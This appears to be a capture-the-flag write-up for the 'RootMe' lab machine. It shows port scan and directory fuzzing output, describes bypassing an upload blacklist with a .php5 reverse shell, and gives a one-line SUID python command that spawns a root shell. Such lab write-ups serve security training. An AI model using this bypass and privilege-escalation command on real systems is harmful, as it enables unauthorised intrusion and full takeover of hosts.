# RootMe

**Hostname:**\
`rootme`

**OS:**\
`Ubuntu Linux`

**Users:**\
`rootme`\
`test`

===============================================================

## Port Scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

===============================================================

## Recon:

### Web Recon:

**Server:**\
Apache 2.4.29

### Fuzzing

```
 :: Method           : GET
 :: URL              : http://10.10.21.235/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

js                      [Status: 200, Size: 958, Words: 65, Lines: 17, Duration: 56ms]
css                     [Status: 200, Size: 1125, Words: 70, Lines: 18]
uploads                 [Status: 200, Size: 743, Words: 52, Lines: 16]
panel                   [Status: 200, Size: 732, Words: 175, Lines: 23]
icons                   [Status: 403, Size: 277, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```
- Found the /panel directory which hosts the upload form

===============================================================

## Foothold / Privilege Escalation:

### Initial Foothold

I got initial access through a misconfigured upload panel. The backend blacklisted malicious extensions like php. But I bypassed this by using .php5 extension for the shell since that extension was not on the blacklist.

And since the /uploads/ directory was accessible I could execute the uploaded shell and get a reverse connection to my listener.

---

### Privilege Escalation:

As the www-data user I inspected the SUID bit set binaries and found that python had a SUID sticky bit set.

On gtfobins.com there is a technique of escalating privileges to root if the SUID bit is set on the python binary:

```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```